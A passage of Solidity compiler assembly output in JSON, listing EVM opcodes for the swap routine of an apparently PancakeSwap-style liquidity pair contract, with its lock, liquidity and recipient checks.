										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "119"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "AND"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "PUSH [tag]",
											"value": "120"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "122"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "ADD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "123"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMPDEST"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH [tag]",
											"value": "125"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "JUMPDEST"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "PUSH [tag]",
											"value": "127"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "tag",
											"value": "46"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "JUMPDEST"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "129"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "129"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 11764,
											"end": 11778,
											"name": "DUP5"
										},
										{
											"begin": 11764,
											"end": 11778,
											"name": "ISZERO"
										},
										{
											"begin": 11764,
											"end": 11778,
											"name": "ISZERO"
										},
										{
											"begin": 11764,
											"end": 11778,
											"name": "DUP1"
										},
										{
											"begin": 11764,
											"end": 11796,
											"name": "PUSH [tag]",
											"value": "131"
										},
										{
											"begin": 11764,
											"end": 11796,
											"name": "JUMPI"
										},
										{
											"begin": 11764,
											"end": 11796,
											"name": "POP"
										},
										{
											"begin": 11795,
											"end": 11796,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 11782,
											"end": 11792,
											"name": "DUP5"
										},
										{
											"begin": 11782,
											"end": 11796,
											"name": "GT"
										},
										{
											"begin": 11764,
											"end": 11796,
											"name": "tag",
											"value": "131"
										},
										{
											"begin": 11764,
											"end": 11796,
											"name": "JUMPDEST"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH [tag]",
											"value": "132"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "JUMPI"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "MSTORE"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "ADD"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP1"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP1"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "ADD"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP3"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SUB"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP3"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "MSTORE"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "MSTORE"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "ADD"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP1"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH data",
											"value": "C654718515B5F98052EB92744D97D32CCCABF6E8B2BAE886738591C9B906CFD8"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SWAP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "CODECOPY"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "ADD"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SWAP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "POP"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "POP"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "MLOAD"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "DUP1"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SWAP2"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SUB"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "SWAP1"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "REVERT"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "tag",
											"value": "132"
										},
										{
											"begin": 11743,
											"end": 11857,
											"name": "JUMPDEST"
										},
										{
											"begin": 11868,
											"end": 11885,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 11887,
											"end": 11904,
											"name": "DUP1"
										},
										{
											"begin": 11910,
											"end": 11923,
											"name": "PUSH [tag]",
											"value": "133"
										},
										{
											"begin": 11910,
											"end": 11921,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 11910,
											"end": 11923,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11910,
											"end": 11923,
											"name": "tag",
											"value": "133"
										},
										{
											"begin": 11910,
											"end": 11923,
											"name": "JUMPDEST"
										},
										{
											"begin": 11867,
											"end": 11923,
											"name": "POP"
										},
										{
											"begin": 11867,
											"end": 11923,
											"name": "SWAP2"
										},
										{
											"begin": 11867,
											"end": 11923,
											"name": "POP"
										},
										{
											"begin": 11867,
											"end": 11923,
											"name": "SWAP2"
										},
										{
											"begin": 11867,
											"end": 11923,
											"name": "POP"
										},
										{
											"begin": 11982,
											"end": 11991,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 11969,
											"end": 11991,
											"name": "AND"
										},
										{
											"begin": 11969,
											"end": 11979,
											"name": "DUP8"
										},
										{
											"begin": 11969,
											"end": 11991,
											"name": "LT"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "DUP1"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "ISZERO"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "PUSH [tag]",
											"value": "134"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "JUMPI"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "POP"
										},
										{
											"begin": 12008,
											"end": 12017,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 11995,
											"end": 12017,
											"name": "AND"
										},
										{
											"begin": 11995,
											"end": 12005,
											"name": "DUP7"
										},
										{
											"begin": 11995,
											"end": 12017,
											"name": "LT"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "tag",
											"value": "134"
										},
										{
											"begin": 11969,
											"end": 12017,
											"name": "JUMPDEST"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH [tag]",
											"value": "135"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "JUMPI"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP1"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP2"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MSTORE"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP3"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "ADD"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MSTORE"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP3"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "ADD"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MSTORE"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "50616E63616B653A20494E53554646494349454E545F4C495155494449545900"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP3"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "ADD"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MSTORE"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "SWAP1"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "MLOAD"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "SWAP1"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "DUP2"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "SWAP1"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "SUB"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "ADD"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "SWAP1"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "REVERT"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "tag",
											"value": "135"
										},
										{
											"begin": 11948,
											"end": 12074,
											"name": "JUMPDEST"
										},
										{
											"begin": 12085,
											"end": 12098,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12085,
											"end": 12098,
											"name": "DUP1"
										},
										{
											"begin": 12085,
											"end": 12098,
											"name": "DUP1"
										},
										{
											"begin": 12198,
											"end": 12201,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12193,
											"end": 12194,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 12180,
											"end": 12194,
											"name": "DUP12"
										},
										{
											"begin": 12180,
											"end": 12194,
											"name": "MUL"
										},
										{
											"begin": 12179,
											"end": 12201,
											"name": "DIV"
										},
										{
											"begin": 12166,
											"end": 12201,
											"name": "DUP11"
										},
										{
											"begin": 12166,
											"end": 12201,
											"name": "SUB"
										},
										{
											"begin": 12166,
											"end": 12201,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 12215,
											"end": 12233,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12268,
											"end": 12271,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12263,
											"end": 12264,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 12250,
											"end": 12264,
											"name": "DUP12"
										},
										{
											"begin": 12250,
											"end": 12264,
											"name": "MUL"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "SLOAD"
										},
										{
											"begin": 12409,
											"end": 12415,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 12409,
											"end": 12415,
											"name": "SLOAD"
										},
										{
											"begin": 12249,
											"end": 12271,
											"name": "SWAP3"
										},
										{
											"begin": 12249,
											"end": 12271,
											"name": "SWAP1"
										},
										{
											"begin": 12249,
											"end": 12271,
											"name": "SWAP2"
										},
										{
											"begin": 12249,
											"end": 12271,
											"name": "DIV"
										},
										{
											"begin": 12236,
											"end": 12271,
											"name": "DUP13"
										},
										{
											"begin": 12236,
											"end": 12271,
											"name": "SUB"
										},
										{
											"begin": 12236,
											"end": 12271,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "SWAP1"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "DUP2"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "AND"
										},
										{
											"begin": 12371,
											"end": 12377,
											"name": "SWAP2"
										},
										{
											"begin": 12409,
											"end": 12415,
											"name": "DUP2"
										},
										{
											"begin": 12409,
											"end": 12415,
											"name": "AND"
										},
										{
											"begin": 12409,
											"end": 12415,
											"name": "SWAP1"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "DUP12"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "AND"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "DUP3"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "EQ"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "DUP1"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "ISZERO"
										},
										{
											"begin": 12437,
											"end": 12450,
											"name": "SWAP1"
										},
										{
											"begin": 12437,
											"end": 12467,
											"name": "PUSH [tag]",
											"value": "138"
										},
										{
											"begin": 12437,
											"end": 12467,
											"name": "JUMPI"
										},
										{
											"begin": 12437,
											"end": 12467,
											"name": "POP"
										},
										{
											"begin": 12460,
											"end": 12467,
											"name": "DUP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12454,
											"end": 12467,
											"name": "AND"
										},
										{
											"begin": 12454,
											"end": 12456,
											"name": "DUP12"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12454,
											"end": 12467,
											"name": "AND"
										},
										{
											"begin": 12454,
											"end": 12467,
											"name": "EQ"
										},
										{
											"begin": 12454,
											"end": 12467,
											"name": "ISZERO"
										},
										{
											"begin": 12437,
											"end": 12467,
											"name": "tag",
											"value": "138"
										},
										{
											"begin": 12437,
											"end": 12467,
											"name": "JUMPDEST"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH [tag]",
											"value": "139"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "JUMPI"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP1"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP2"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MSTORE"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP3"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "ADD"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MSTORE"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "13"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP3"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "ADD"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F544F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "68"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP3"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "ADD"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MSTORE"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "SWAP1"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "MLOAD"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "SWAP1"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "DUP2"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "SWAP1"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "SUB"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "ADD"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "SWAP1"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "REVERT"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "tag",
											"value": "139"
										},
										{
											"begin": 12429,
											"end": 12491,
											"name": "JUMPDEST"
										},
										{
											"begin": 12509,
											"end": 12523,
											"name": "DUP13"
										},
										{
											"begin": 12509,
											"end": 12523,
											"name": "ISZERO"
										},
										{
											"begin": 12505,
											"end": 12566,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 12505,
											"end": 12566,
											"name": "JUMPI"
										},
										{
											"begin": 12525,
											"end": 12566,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 12539,
											"end": 12546,
											"name": "DUP3"
										},
										{
											"begin": 12548,
											"end": 12550,
											"name": "DUP13"
										},
										{
											"begin": 12552,
											"end": 12565,
											"name": "DUP7"
										},
										{
											"begin": 12525,
											"end": 12538,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 12525,
											"end": 12566,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12525,
											"end": 12566,
											"name": "tag",
											"value": "141"
										},
										{
											"begin": 12525,
											"end": 12566,
											"name": "JUMPDEST"
										},
										{
											"begin": 12618,
											"end": 12632,
											"name": "DUP12"
										},
										{
											"begin": 12618,
											"end": 12632,
											"name": "ISZERO"
										},
										{
											"begin": 12614,
											"end": 12675,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 12614,
											"end": 12675,
											"name": "JUMPI"
										},
										{
											"begin": 12634,
											"end": 12675,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 12648,
											"end": 12655,
											"name": "DUP2"
										},
										{
											"begin": 12657,
											"end": 12659,
											"name": "DUP13"
										},
										{
											"begin": 12661,
											"end": 12674,
											"name": "DUP6"
										},
										{
											"begin": 12634,
											"end": 12647,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 12634,
											"end": 12675,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 12634,
											"end": 12675,
											"name": "tag",
											"value": "144"
										},
										{
											"begin": 12634,
											"end": 12675,
											"name": "JUMPDEST"
										},
										{
											"begin": 12727,
											"end": 12742,
											"name": "DUP9"
										},
										{
											"begin": 12727,
											"end": 12742,
											"name": "ISZERO"
										},
										{
											"begin": 12723,
											"end": 12960,
											"name": "PUSH [tag]",
											"value": "145"
										},
										{
											"begin": 12723,
											"end": 12960,
											"name": "JUMPI"
										},
										{
											"begin": 12768,
											"end": 12770,
											"name": "DUP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 12760,
											"end": 12783,
											"name": "AND"
										},
										{
											"begin": 12760,
											"end": 12783,
											"name": "PUSH",
											"value": "84800812"
										},
										{
											"begin": 12805,
											"end": 12815,
											"name": "CALLER"
										},
										{
											"begin": 12837,
											"end": 12850,
											"name": "DUP7"
										},
										{
											"begin": 12887,
											"end": 12900,
											"name": "DUP7"
										},
										{
											"begin": 12938,
											"end": 12942,
											"name": "DUP15"
										},
										{
											"begin": 12938,
											"end": 12942,
											"name": "DUP15"
										},
										{
											"begin": 12760,
											"end": 12960,
